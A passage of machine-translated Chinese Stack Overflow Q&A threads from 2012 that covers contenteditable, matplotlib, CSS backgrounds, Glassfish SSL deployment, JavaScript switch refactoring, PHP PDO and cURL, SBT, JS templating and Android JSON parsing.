有什么办法，使用内部 DIV 的格式，或任何其他方式。我已经对[关键事件](http://codebits.glennjones.net/editing/events-contenteditable.htm)进行了试验，但到目前为止只有零星的结果。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-18T09:10:46.133

看演示

[http://jsfiddle.net/uk6DA/21/](http://jsfiddle.net/uk6DA/21/)

您只需要对段落应用 contenteditable。

```
<div class="container" id="typer" style="border:1px solid gray; height:300px; width:520px; padding:4px; text-align:justify; text-justify:distribute-all-lines;">

        <img style="border:1px solid #cccccc; float: left; margin: 3px;" src="http://ts1.mm.bing.net/th?id=I4951402157179616&pid=1.7&w=139&h=136&c=7&rs=1" /><p>  
    If I Select All and press Delete, or press Backspace enough times, I can delete the troll.  Is there any way to make it impossible to delete the troll?<br/><br/>
    Curabitur nec metus arcu. Sed aliquam felis at leo luctus facilisis. Maecenas tortor urna, dignissim id imperdiet nec, vulputate a nisl. Morbi turpis augue, malesuada et viverra blandit, ultrices at eros. Ut id urna vitae odio iaculis ullamcorper. Proin tortor est, adipiscing id rutrum vitae, blandit ac purus. Maecenas eu turpis lectus, quis elementum nisi. Nullam lobortis, lectus eu ornare iaculis, felis lacus condimentum sapien, id laoreet velit neque at metus. Etiam scelerisque pulvinar dignissim. Proin rhoncus iaculis dolor, vel tincidunt velit feugiat quis. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Sed tellus quam, gravida vel posuere at, elementum eu 

               <p> </div>​ 
```

javascript

```
$("#typer").click(function(){
$(this).children('p').attr('contentEditable','true');
});​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-06-03T14:33:13.313

尝试使用类似的方法，将可编辑部分嵌套在不可编辑的元素中 -

```
<p> uneditable text 
<p contenteditable> editable text </p>
</p> 
```

* * *

## 回答 #3

> 赞同：-4
> 
> 时间：2012-08-18T00:39:42.613

是的，您可以轻松地做到这一点。只需将属性添加到您的图像`contenteditable="false"`和具有此属性的元素就不会受到编辑命令的影响。

所以基本上你的`img`标签应该是这样的：

```
 <img contenteditable="false" style="border:1px solid #cccccc; float: left; margin: 3px;" src="http://ts1.mm.bing.net/th?id=I4951402157179616&pid=1.7&w=139&h=136&c=7&rs=1" /> 
```

和小提琴展示它[http://jsfiddle.net/uk6DA/17/](http://jsfiddle.net/uk6DA/17/)

# testing - 如何绘制三个参数的组合

> ID：12014714
> 
> 赞同：0
> 
> 时间：2012-08-18T00:20:33.503
> 
> 标签：testing, parameters, plot, matplotlib

我的算法有三个输入参数：

```
param1 in {0.1, 0.5, 1.0, 90, 95, +inf}
param2 in {10, 20, 30, 40, 60, 80, 100}
param3 in {0.01, 0.05, 0.10} 
```

我对这些输入值的所有组合进行了测试，得到了不同的输出。输出值为两个：`# of rejected samples`, `# of non-rejected samples`。显然，总和给出了样本的总数。

我如何绘制所有这些以直观地确认哪些参数产生最大`# of non-rejected samples / total # of samples`分数？

我可以使用`matplotlib`，但是当涉及多个参数时，我不知道如何进行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-20T01:10:03.283

运气好的话，你会得到一个 3 维数组的结果。只要 param1 有合理数量的元素，我会像这样使用 imshow ：

```
max_val = 2000
plot_shape=(3,3)
for n, img in enumerate(data_cube):
    ax = subplot(plot_shape[0], plot_shape[1], n+1)
    title('Results for Param3=%0.3f'%param3[n])
    ax.set_xticks(range(len(params3)))
    ax.set_xticklabels([str(x) for x in params3])
    ax.set_yticks(range(len(params2)))
    ax.set_yticklabels([str(x) for x in params2])
    xlabel('param3')
    ylabel('param2')
    imshow(img, vmin=0, vmax=max_val) 
```

# css - 通过 CSS 选择背景图片，有什么区别？

> ID：12014716
> 
> 赞同：0
> 
> 时间：2012-08-18T00:20:37.533
> 
> 标签：css

我正在玩一些 CSS，到目前为止，所有这些似乎都在做同样的事情：

```
background: url('/images/file.png');
background: image-url('file.png'); /* Doesn't requires as much info about the path. */
background-image: url('/images/file.png'); 
```

有区别还是只是取决于偏好？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-18T00:25:31.843

您的第一个属性声明是简写：

```
background: #COLOR url('image.png'); 
```

这相当于：

```
background-color: #COLOR;
background-image: url('image.png'); 
```

通过省略颜色，您只是指定图像。

[以及来自CSS2 规范](http://www.w3.org/TR/CSS2/colors.html#background-properties)的属性信息：

> 'background' 属性是一个简写属性，用于在样式表中的相同位置。第二个是无效的CSS。

第二个只是无效的CSS。不要使用它。

第三个是首选，因为它不会重置其他属性（也来自规范）：

> 给定一个有效的声明，'background' 属性首先将所有单独的背景属性设置为其初始值，然后分配声明中给出的显式值。

# java - Glassfish 3.1.2 build 5 WAR 部署问题

> ID：12014718
> 
> 赞同：0
> 
> 时间：2012-08-18T00:20:41.010
> 
> 标签：java, wsdl, glassfish, war, httplistener

我在将 Java WAR 部署到 Glassfish 3.1.2 build 5 时遇到问题。我想排除这是否与配置错误或遗漏有关。

我有一个部署到 Glassfish 的 Web 应用程序运行良好，直到我更改了其中一个 http 侦听器。在此之前，除了更改 http-listener-2 的 SSL 设置下的证书昵称外，我没有更改任何默认侦听器（http-listener-1 表示非安全，http-listener-2 表示安全）。

当我将 http-listener-1 更改为也使用安全性时，问题就开始了。我想在那个监听器上使用不同的证书。但是，一旦我为所有活动的侦听器启用 SSL，我发现我无法再将我的 WAR 部署到 Glassfish。我会在 server.log 中收到以下错误：

```
[#|2012-08-17T13:42:24.686-0700|SEVERE|glassfish3.1.2|javax.enterprise.system.core.com.sun.enterprise.v3.server|_ThreadID=2257;_ThreadName=Thread-2;|java.lang.RuntimeException
at org.glassfish.webservices.WebServicesDeployer.prepare(WebServicesDeployer.java:193)
at com.sun.enterprise.v3.server.ApplicationLifecycle.prepareModule(ApplicationLifecycle.java:871)
at com.sun.enterprise.v3.server.ApplicationLifecycle.deploy(ApplicationLifecycle.java:410)
at com.sun.enterprise.v3.server.ApplicationLifecycle.deploy(ApplicationLifecycle.java:240)
at org.glassfish.deployment.admin.DeployCommand.execute(DeployCommand.java:389)
at com.sun.enterprise.v3.admin.CommandRunnerImpl$1.execute(CommandRunnerImpl.java:348)
at com.sun.enterprise.v3.admin.CommandRunnerImpl.doCommand(CommandRunnerImpl.java:363)
at com.sun.enterprise.v3.admin.CommandRunnerImpl.doCommand(CommandRunnerImpl.java:1085)
at com.sun.enterprise.v3.admin.CommandRunnerImpl.access$1200(CommandRunnerImpl.java:95)
at com.sun.enterprise.v3.admin.CommandRunnerImpl$ExecutionContext.execute(CommandRunnerImpl.java:1291)
...
at com.sun.grizzly.util.AbstractThreadPool$Worker.doWork(AbstractThreadPool.java:532)
at com.sun.grizzly.util.AbstractThreadPool$Worker.run(AbstractThreadPool.java:513)
at java.lang.Thread.run(Thread.java:722)

Caused by: java.lang.NullPointerException
at com.sun.enterprise.deployment.WebServiceEndpoint.composeEndpointAddress(WebServiceEndpoint.java:698)
at com.sun.enterprise.deployment.WebServiceEndpoint.composeEndpointAddress(WebServiceEndpoint.java:690)
at com.sun.enterprise.deployment.WebServiceEndpoint.composeFinalWsdlUrl(WebServiceEndpoint.java:753)
at org.glassfish.webservices.WebServicesDeployer.doWebServicesDeployment(WebServicesDeployer.java:634)
at org.glassfish.webservices.WebServicesDeployer.prepare(WebServicesDeployer.java:184)
... 53 more 
```

我已经从官方网站安装了最新版本的 Glassfish。

一些研究让我想知道是否需要在 glassfish-web.xml 或 web.xml 文件中添加一些配置，以指定传输保证必须是机密的。我尝试了此处列出的配置：

[http://www.java-tips.org/java-ee-tips/java-api-for-xml-web-services/using-jax-ws-based-web-services-wit.html](http://www.java-tips.org/java-ee-tips/java-api-for-xml-web-services/using-jax-ws-based-web-services-wit.html)

但我仍然无法部署我的 WAR。唯一能解决这个问题的是创建第三个不支持 SSL 的 http-listener。这是预期的行为还是我做错了什么？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-24T09:58:23.100

将 WAR（在 web.xml 中具有机密 SSLConstraint）部署到 GlassFish Server Open Source Edition 3.1.2.2（内部版本 5）时遇到了同样的问题。我必须创建一个非 https 侦听器来解决这个问题。

我认为这不是预期的行为，尤其是由于 nullpointer 异常。

# javascript - 简化 JavaScript 中的 switch case

> ID：12014720
> 
> 赞同：2
> 
> 时间：2012-08-18T00:20:57.910
> 
> 标签：javascript, jquery, switch-statement, swipe

我有一个相当重复的 switch case 语句，为了学习最简单的做事方式，我想转向 SO，看看是否有更优雅的解决方案来解决以下问题：

```
 switch(id)
        {
            case 'ib-02a':
                if(direction == 'left')
                    setHash('ib-02b');
                break;
            case 'ib-02b':
                if(direction == 'right')
                    setHash('ib-02a');
                if(direction == 'left')
                    setHash('ib-02c');
                break;
            case 'ib-02c':
                if(direction == 'right')
                    setHash('ib-02b');
                if(direction == 'left')
                    setHash('ib-02d');
                break;
            case 'ib-02d':
                if(direction == 'right')
                    setHash('ib-02c');
            break;

            case 'ib-03a':
                if(direction == 'left')
                    setHash('ib-03b');
                break;
            case 'ib-03b':
                if(direction == 'right')
                    setHash('ib-03a');
                if(direction == 'left')
                    setHash('ib-03c');
                break;
            case 'ib-03c':
                if(direction == 'right')
                    setHash('ib-03b');
                if(direction == 'left')
                    setHash('ib-03d');
                break;
            case 'ib-03d':
                if(direction == 'right')
                    setHash('ib-03c');
            break;

            case 'pb-05a':
                if(direction == 'left')
                    setHash('pb-05b');
                break;
            case 'pb-05b':
                if(direction == 'right')
                    setHash('pb-05a');
                if(direction == 'left')
                    setHash('pb-05c');
                break;
            case 'pb-05c':
                if(direction == 'right')
                    setHash('pb-05b');
                if(direction == 'left')
                    setHash('pb-05d');
                break;
            case 'pb-05d':
                if(direction == 'right')
                    setHash('pb-05c');
            break;
        } 
```

我正在阅读滑动事件，如果我正在滑动的元素的 ID 与 ib-02*、ib-03* 或 pb-05* 匹配，我正在为适当的 ID 调用 setHash 函数。如果我在 *a 上滑动，我会向左滑动到 *b。如果我在 *b 上滑动，我向右滑动到 *a 并向左滑动到 *c。以此类推，总是在 *a 和 *d 之间。

必须有一种较少重复的方法来做到这一点，但我不确定最好的方法是什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T00:44:56.480

有 4 种主要情况是`a`、和`b`，您可以将 switch 语句基于这些字符串，试试这个：`c``d`

```
var c = id.slice(0, 5); // "ib-02" or "ib-03" or "ib-04" ...
var which = id.slice(-1); // "a" or "b" or "c" or "d"
switch(which) {
    case 'a':
       if(direction == 'left')
             setHash(c+'b');
          break;
    case 'b':
       if(direction == 'right')
             setHash(c+'a');
       if(direction == 'left')
             setHash(c+'c');
          break;
    case 'c':
       if(direction == 'right')
             setHash(c+'b');
       if(direction == 'left')
             setHash(c+'d');
          break;
    case 'd':
       if(direction == 'right')
            setHash(c+'c');
          break;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-18T00:35:34.110

如何将它们映射到一个对象？然后只需将`setHash`与检索到的值一起使用。

```
var ids = {
    'pb-05c' : {
        left : 'pb-05d',
        right : 'pb-05b'
    }
    ...
}

function setHashes(id,direction){
    if(id && ids[id]){
        id = ids[id];
        if(direction && id[direction]){
            setHash(id[direction]);
        }
    }
} 
```

都是检索，没有条件评估，这对性能有好处。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-18T00:57:30.657

```
id='ib-02a'; //you have string id, this one is for demo
id=[id.slice(0,--id.length), id.charAt(--id.length)];

switch(id[1]){
    case 'a':
        if(direction == 'left'){setHash(id[0]+'b');}
        break;
    case 'b':
        if(direction =='right'){setHash(id[0]+'a');}
        if(direction == 'left'){setHash(id[0]+'c');}
        break;
    case 'c':
        if(direction == 'right'){setHash(id[0]+'b');}
        if(direction == 'left'){setHash(id[0]+'d');}
        break;
    case 'd':
        if(direction == 'right'){setHash(id[0]+'c');}
        break;
} 
```

如果案例 b 和 c 只是“左”或“右”，则可以`else`在这些 if 语句中使用 an。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-18T01:19:09.217

我喜欢 undefined 和 GitaarLab 的总体方向，他们实际上解决了算法并实现了算法。回顾一下，该算法基本上是`left`增加最后一个字母并`right`减少 id 的最后一个字母，但你不要低于`a`或高于`d`。所以，我做了一个紧凑的实现，我将最后一个字母转换为数字并直接增加或减少它，而不是使用 if/else 或 case 语句：

```
function setNewHash(id, direction) {
    var base = id.substr(0, 5);
    var tag = id.charCodeAt(5), newTag;
    var nav = {left: 1, right: -1};
    var delta = nav[direction];
    if (delta) {
        tag += delta;
        newTag = String.fromCharCode(tag);
        if (newTag >= 'a' && newTag <= 'd') {
            setHash(base + newTag);
        }
    }
} 
```

工作测试用例：http: [//jsfiddle.net/jfriend00/gwfLD/](http://jsfiddle.net/jfriend00/gwfLD/)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-18T00:39:43.387

您可以像这样驱动整个数据表：

```
var logicData = {
    // format is the id first and then an array with the left, then right value for the hash
    // leave an item as an empty string if you don't ever want to go that direction
    'ib-02a': ['ib-02b', ''],
    'ib-02b': ['ib-02c', 'ib-02a'],
    'ib-02c': ['ib-02d', 'ib-02d']
    // fill in the rest of the data table here
};

function setNewHash(id, direction) {
    var hash, data = logicData[id];
    if (data) {
        if (direction == 'left') {
            hash = data[0];
        } else if (direction == 'right') {
            hash = data[1];
        }
        if (hash) {
            setHash(hash);
        }
    }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-18T00:50:46.667

您可以切换 id 和 direction 检查以使其更清晰：

```
switch (direction) {
  case 'left':
    switch (id) {
      case 'ib-02a': setHash('ib-02b'); break;
      case 'ib-02b': setHash('ib-02c'); break;
      case 'ib-02c': setHash('ib-02d'); break;
      case 'ib-03a': setHash('ib-03b'); break;
      case 'ib-03b': setHash('ib-03c'); break;
      case 'ib-03c': setHash('ib-03d'); break;
      case 'pb-05a': setHash('pb-05b'); break;
      case 'pb-05b': setHash('pb-05c'); break;
      case 'pb-05c': setHash('pb-05d'); break;
    }
    break;
  case 'right':
    switch (id) {
      case 'ib-02b': setHash('ib-02a'); break;
      case 'ib-02c': setHash('ib-02b'); break;
      case 'ib-02d': setHash('ib-02c'); break;
      case 'ib-03b': setHash('ib-03a'); break;
      case 'ib-03c': setHash('ib-03b'); break;
      case 'ib-03d': setHash('ib-03c'); break;
      case 'pb-05b': setHash('pb-05a'); break;
      case 'pb-05c': setHash('pb-05b'); break;
      case 'pb-05d': setHash('pb-05c'); break;
    }
    break;
} 
```

然后，您可以通过拆分 id 来简化 if：

```
var first = id.substr(0, 5);
var last = id.substr(6);
switch (direction) {
  case 'left':
    switch (last) {
      case 'a': setHash(first + 'b'); break;
      case 'b': setHash(first + 'c'); break;
      case 'c': setHash(first + 'd'); break;
    }
    break;
  case 'right':
    switch (last) {
      case 'b': setHash(first + 'a'); break;
      case 'c': setHash(first + 'b'); break;
      case 'd': setHash(first + 'c'); break;
    }
    break;
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-18T00:32:40.193

您可以将 id 分成不同的部分，然后在执行之前重新构建它们`setHash`。

```
function chunkId(id) {
    // use a regex or string split or something to convert
    // "ib-05a" to ["ib-05", "a"]
    return ["ib-05", "a"];
}

function next(str) {
    // return the next letter in the alphabet here
    return "b";
}

function prev(str) {
    // return the prev letter in the alphabet here
    return "b";
}

function swipe (id, direction) {
    var array = chunkId(id);
    // you can only swipe left if not on "d"
    if (direction === "left" && id[1] != "d") {
        setHash(id[0] + next(id[1])); // build hash based on next character
    }
    // you can only swipe right if not on "a"
    if (direction === "right" && id[1] != "a") {
        setHash(id[0] + prev(id[1])); // build hash based on prev character
    }
} 
```

# matlab - 在 Emacs matlab-mode 中启动远程 Matlab 进程？

> ID：12014726
> 
> 赞同：9
> 
> 时间：2012-08-18T00:21:43.467
> 
> 标签：matlab, emacs, ssh

我通过 ssh 远程使用 Matlab，并且想从 Emacs 中的 m 文件执行代码区域，而无需剪切和粘贴。我如何配置 Emacs 来做到这一点？

我尝试遵循[此处](https://stackoverflow.com/questions/1133498/is-it-possible-for-emacs-to-run-a-matlab-shell-that-is-located-on-a-remote-serve)提供的解决方案：我编写了一个连接到服务器并打开 Matlab 的脚本。当我在终端中运行该脚本时，该脚本有效。我按照该页面上的说明编辑了 matlab.el。现在，如果我在 Emacs 中编辑我的 m 文件并尝试启动 Matlab，我会收到一条消息，它无法执行我的 remoteMatlab.sh 文件，并且 M-shell 以代码 1 异常退出。

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-04-28T05:01:42.213

您可以在 emacs 中运行一个 shell，在其中启动 ssh 和 matlab 会话，然后将 shell 缓冲区从 `*term*`或其他名称重命名为 `*MATLAB*`. 然后，您可以在脚本文件上使用 matlab-mode 并运行代码。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-08-29T23:01:44.763

这不完全是你所要求的，但可能会达到同样的效果。您可以使用函数 dbstop，它允许您通过代码设置调试断点。

[http://www.mathworks.com/help/techdoc/ref/dbstop.html#inputarg_location](http://www.mathworks.com/help/techdoc/ref/dbstop.html#inputarg_location)

# php - while 循环和 PDO 语句

> ID：12014727
> 
> 赞同：3
> 
> 时间：2012-08-18T00:21:55.847
> 
> 标签：php, pdo, while-loop

我在 PDO 语句之后有一个 while 循环。我的代码如下。

```
 $query = "SELECT * FROM private_messages WHERE to_id = :my_id AND to_email = :email AND    recipient_delete='0' ORDER BY time_sent DESC";
 $stmt = $dbo->prepare($query);
 $stmt->execute(array(":my_id" => $my_id, ":email" => $email));
 $row = $stmt->fetch();
 while($row = $stmt->fetch()){ ... 
```

输出的结果总是缺少其中的一行，因此用户最近收到的私人消息永远不会显示。我有一个通知器，它告诉用户他们有多少新消息，这些消息计数正确（它表明他们比实际消息列表输出多一条消息）。我无法使用谷歌找到答案，这让我发疯。这是自 80 年代早期 BASIC 以来我第一次尝试使用任何类型的语言进行编程，所以我把所有的时间都花在了阅读相关内容上，但找不到任何可以帮助我解决这个问题的东西。谁能告诉我哪里出错了？谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-18T00:23:31.257

删除行：

```
$row = $stmt->fetch(); 
```

它将第一行放在里面`$row`

那么当你这样做时：

```
while($row = $stmt->fetch()){ ... 
```

它从第二行开始获取，而你获取的第一行丢失了，这就是为什么你总是只丢失一行。

# android - 如何将 Android 开发设备/模拟器连接到 cygwin？

> ID：12014728
> 
> 赞同：1
> 
> 时间：2012-08-18T00:22:15.883
> 
> 标签：android, ant, android-ndk, cygwin, installation

我正在尝试使用 Android NDK Beginners Guide book 来学习 Android NDK，当时我在第 2 章中遇到了编译 hello-jni 文件的这一步。我不知道如何将我的 Android 开发设备连接到 cygwin 终端...有人可以帮忙吗？

书中这一步之后的步骤是 ant install，当我尝试该命令时，构建失败。我假设这是因为我没有将设备连接到 cygwin。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T05:58:42.960

NDK 适用于 Windows，你不需要 Cygwin，如果这本书告诉你使用 Cygwin：切换到更好的书！

[http://developer.android.com/tools/sdk/ndk/index.html](http://developer.android.com/tools/sdk/ndk/index.html)

# php - cURL 页面和导航 DOM

> ID：12014730
> 
> 赞同：0
> 
> 时间：2012-08-18T00:22:25.280
> 
> 标签：php, curl, web-scraping

我只是想用下面的脚本检索页面的标题。但是，我做错了，因为我不断收到此错误：

```
PHP Fatal error:  Call to a member function getElementsByTagName() on a non-object in /Users/robertquinn/Desktop/SCRAPE/asu.php on line 22 
```

这是我第一次使用 curl 函数，所以如果我在这里搞砸了，请告诉我。getElementsByTagName() 是一种 XML DOM 方法吗？

```
<?php  

    function get_data($url) {

        $userAgent = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB5';
        $ch = curl_init();
        curl_setopt($ch,CURLOPT_COOKIE,"someCookie=2127;onlineSelection=C");
        curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
        curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FAILONERROR, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_AUTOREFERER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 100);
        $html = curl_exec($ch);
        curl_close($ch);

        $doc = new DOMDocument();
        $body = $doc->loadHTML( $html );
        $title_value = $body->getElementsByTagName('title')->nodeValue;

        echo $title_value;
    }

    get_data('http://www.someurl.com');

    ?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T00:30:20.090

也改变你的 DOMDocument 部分：

```
 $doc = new DOMDocument();
 $doc->loadHTML( $html );
 //Suppress strict errors or you could just suppress errors directly e.g: @$doc->loadHTML( $html );
 $doc->strictErrorChecking = false;

 $title_value = $doc->getElementsByTagName('title')->item(0)->nodeValue; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T06:40:13.570

我喜欢使用[simple_html_dom](http://simplehtmldom.sourceforge.net/)真的很简单，例如我会这样做

```
...
$page = curl_exec($ch);

$html = str_get_html($page);
echo $html->find('title', 0)->plaintext; 
```

# scala - SBT - 获取托管 jar 的路径

> ID：12014731
> 
> 赞同：4
> 
> 时间：2012-08-18T00:22:39.263
> 
> 标签：scala, sbt, dependency-management, jooq

我想使用一些依赖项在 Scala 中执行代码生成。

例子：

```
libraryDependencies += "org.jooq" % "jooq" % "2.4.0"

val jooqTask = jooq := {
  val classpath = "jooq-2.4.0.jar;jooq-meta-2.4.0.jar;jooq-codegen-2.4.0.jar;."
  val main = "org.jooq.util.GenerationTool"

  "java -classpath %s %s /project/jooq-configuration.xml".format(classpath, main) !
} 
```

但是，我想获取依赖项的类路径，因此我可以实际运行 Java 进程。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-24T11:05:59.767

您可以像这样获取编译依赖项的类路径：

```
val jooqTask = jooq <<= managedClasspath in Compile map { cp =>
  val classpath = Path.makeString(cp.files))
  val main = "org.jooq.util.GenerationTool"

  "java -classpath %s %s /project/jooq-configuration.xml".format(classpath, main) !
} 
```

请注意，类路径不包括“。” （又名当前目录），但是。

# database - 将表的一个属性转换为另一个表的属性的最有效方法？

> ID：12014732
> 
> 赞同：0
> 
> 时间：2012-08-18T00:23:02.200
> 
> 标签：database, database-design, relational-database

**情况：**假设我们有 2 张桌子。表 A 和表 B。

表A：

*   援助
*   一个名字

**问题：**就设计而言，使“A_name”的值成为 TableB 的所有列的最有效方法是什么？

**示例：**如果 A_name 包含：“Foo”、“Foo1”、“Foo2”，则 TableB 应如下所示：

表B：

*   富
*   Foo1
*   Foo2

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T01:54:10.497

您是在谈论创建一个新表，其列将由 TableA 的内容驱动吗？

有几种产品可以让您以交互方式和可视化方式构建要构建的表格模型。然后，您可以调用生成脚本的函数来创建表。这些产品中的每一个都会将您在 TableA 中的字符串信息存储在一个单独的数据库中，该数据库的主题是真实数据库的模型。

# javascript - 展示纯 js 应用程序前端的最佳架构是什么？

> ID：12014739
> 
> 赞同：1
> 
> 时间：2012-08-18T00:23:50.327
> 
> 标签：javascript, html, frontend, web-frontend

基本上，如果您有一个纯粹的 JS 应用程序（从 socket.io 或从具有 ajax 请求的服务器获取信息），并且您需要在处理后显示这些数据，您使用的是什么技术？

目前我正在使用类似的代码手动创建元素

```
var myDiv = new Element('div',{ /* options */); 
```

并将它注入到我需要制作所有 DOM 结构的地方。我发现这很难维护，尤其是对于那些可以编写 html 代码但无法从 JS 编写 html 代码的设计师而言。

有什么方法可以改善这个过程吗？从ajax获取html更好吗？或者只是在字符串中制作html代码？

我正在寻找维护和资源方面的最佳选择。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T00:35:19.063

您正在寻找的是“模板”。

您有一个 HTML 模板（一些 div 等），并将其与您在 JS 中提供的数据绑定。然后，无论您使用什么模板引擎，您都可以获得完整的 HTML。

这里有一些模板引擎：

*   [https://github.com/flatiron/plates](https://github.com/flatiron/plates)
*   [http://embeddedjs.com/](http://embeddedjs.com/)

以及使用板块的代码示例：

```
var Plates = require('plates'); // specific to node.js, see for client-side use

var html = '<div id="test">Old Value</div>';
var data = { "test": "New Value" };

var output = Plates.bind(html, data); 
console.log( output ); // '<div id="test">New Value</div>' 
```

您可以将模板存储在通过 ajax 加载的单个文件（“templates.html”）中，也可以将其存储在 HTML 页面中（不建议用于维护问题）。

如果将它们全部存储在外部文件中，则可以执行以下操作：

模板.html：

```
<!-- text/html isn't parsed by the browser so we can put anything in it -->
<script type="text/html" id="template1"> 
    <!-- put your template in there
</script> 
```

您可以通过`getElementById( 'template1' )`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T00:35:45.700

如果项目处于后期阶段，最简单的方法是添加 jQuery.template 插件之类的东西并在单独的文件中创建模板。然后，使用后端将这些和平组合在单个页面中，并在 DOM Ready 上启动您的客户端应用程序。

如果您的项目处于早期阶段，请使用 AngularJs 或 BackboneJS 框架。相信我，每一分钱都是值得的：）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-18T00:30:37.983

我建议你看看[Backbone.js](http://www.backbonejs.org)。

> Backbone.js 通过提供具有键值绑定和自定义事件的模型、具有丰富的可枚举函数 API 的集合、具有声明性事件处理的视图，并通过 RESTful JSON 接口将所有这些连接到您现有的 API，从而为 Web 应用程序提供了结构

即使我没有使用 RESTful 接口，我也会使用骨干网。将结构与行为分开非常容易......您可以使用 jQuery 实现相同的效果，但它不会那么整洁。它是 MV* 框架之一。你有：

1.  包含交互式数据以及围绕它的大部分逻辑的模型：转换、验证、计算属性和访问控制。
2.  集合是有序的模型集。
3.  视图：总体思路是将您的界面组织成逻辑视图，由模型支持，每个视图都可以在模型更改时独立更新，而无需重新绘制页面
4.  路由器提供路由客户端页面并将它们连接到动作和事件的方法

最近很受关注。使用 Backbone 创建的应用程序包括：

1.  四方
2.  移动领英

如果您开始使用 Backbone，[这是一个很好的资源。](http://addyosmani.github.com/backbone-fundamentals/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-03T09:49:33.327

远端模板[http://code.google.com/p/distal/](http://code.google.com/p/distal/)：

```
 <table id="a"> 
   <tr><th>OPINIONS</th></tr> 
   <tr data-qrepeat="m keywords"><td data-qtext="m.name"></td></tr> 
 </table> 
```

然后调用：

```
distal(document.getElementById("a"), {
  keywords: [
    {name:"Brilliant"}, {name:"Masterpiece"}, {name:"Witty"}
  ]
}); 
```

会变成：

```
 <table> 
   <tr><th>OPINIONS</th></tr> 
   <tr><td>Brilliant</td></tr> 
   <tr><td>Masterpiece</td></tr> 
   <tr><td>Witty</td></tr> 
 </table> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-03T16:31:59.013

> 并将它注入到我需要制作所有 DOM 结构的地方。我发现这很难维护，尤其是对于那些可以编写 html 代码但无法从 JS 编写 html 代码的设计师而言。

另一种选择是[适度的](https://github.com/sweedl/modest)。正如您从[文档](https://github.com/sweedl/modest/wiki/Documentation#wiki-using-modest-in-javascript)中看到的那样，它消除了 javascript 中对 HTML 块的需求。设计者无需查看javascript就可以改变HTML结构，javascript编码人员可以使用设计者定义的参数来填写数据（全部在javascript中）。

此示例来自自述文件：

HTML：

```
<div>
  <contact>
    <name>Casey Jones</name>
    <phone>123-456-7890</phone>
  </contact>
</div> 
```

Javascript：

```
var contact = {
  name : "Casey Jones",
  cell : "123-456-7890"
};
var out = modest.render('contact',contact); 
```

# java - 从 Django 到 Android 的 JSON 数组

> ID：12014740
> 
> 赞同：2
> 
> 时间：2012-08-18T00:24:03.780
> 
> 标签：java, android, django, json

我在尝试解析从 Django 发送到 Android 的 json 数组字符串时遇到问题。这是json字符串的格式。

```
[
    {
        "pk": 1,
        "model": "brete.brete",
        "fields": {
            "contenido": "93iw09if",
            "fecha": "2011-05-07 03:06:40",
            "codigo_confirmacion": "",
            "correo": "oij8@gmail.com",
            "activado": false,
            "titulo": "234"
        }
    },
    {
        "pk": 2,
        "model": "brete.brete",
        "fields": {
            "contenido": "asoidjfdiso",
            "fecha": "2011-05-07 03:08:09",
            "codigo_confirmacion": "",
            "correo": "oijoiji@oijoi.com",
            "activado": false,
            "titulo": "ijj"
        }
    }
]
etc 
```

这就是我获取数据的方式：

```
 //parse json data
        try{
            JSONArray jArray = new JSONArray(result);
            for(int i=0;i<jArray.length();i++){
                JSONObject json_data = jArray.getJSONObject(i);
                Brete resultRow = new Brete();
                resultRow.contenido = json_data.getString("contenido");
                resultRow.fecha = json_data.getString("fecha");
                resultRow.correo = json_data.getString("correo");
                arrayOfWebData.add(resultRow);
            }
        }
        catch(JSONException e){
                Log.e("log_tag", "Error parsing data "+e.toString());
        } 
```

我正在尝试获取 的数据`'contenido'`，`'fecha'`但`'correo'`我没有显示任何行。这不是全部代码，也许问题出在其他地方，但我有一种预感，这可能是没有正确解析嵌套 json 与 json_data.getString() 的问题。任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T00:45:05.713

在你抓住你的领域之前，你实际上必须接触到“领域”对象：

```
//parse json data
try{
    JSONArray jArray = new JSONArray(result);
    for(int i=0;i<jArray.length();i++){
        JSONObject buf = jArray.getJSONObject(i);
        JSONObject json_data = buf.getJSONObject("fields");
        Brete resultRow = new Brete();
        resultRow.contenido = json_data.getString("contenido");
        resultRow.fecha = json_data.getString("fecha");
        resultRow.correo = json_data.getString("correo");
        arrayOfWebData.add(resultRow);
    }
}
catch(JSONException e){
